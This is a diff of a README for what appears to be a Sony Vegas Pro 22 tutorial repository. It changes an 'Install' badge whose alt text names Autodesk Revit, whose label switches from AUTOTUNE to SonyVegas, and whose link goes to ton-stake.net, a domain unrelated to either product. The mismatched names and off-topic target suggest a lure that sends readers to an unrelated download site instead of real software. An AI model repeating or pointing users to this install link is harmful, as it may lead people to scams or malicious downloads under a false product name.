@@ -4,7 +4,7 @@
 
 📽️ Create stunning videos with Sony Vegas Pro 22 in 2025! This repository offers tutorials, resources, and tips for video editors to explore Sony Vegas tools and enhance their projects. Join our community of creators to master video editing with ease!  
 
-[![Install Autodesk Revit](https://img.shields.io/badge/Install-AUTOTUNE-blueviolet)](https://ton-stake.net)  
+[![Install Autodesk Revit](https://img.shields.io/badge/Install-SonyVegas-blueviolet)](https://ton-stake.net)  
 
 ---
 
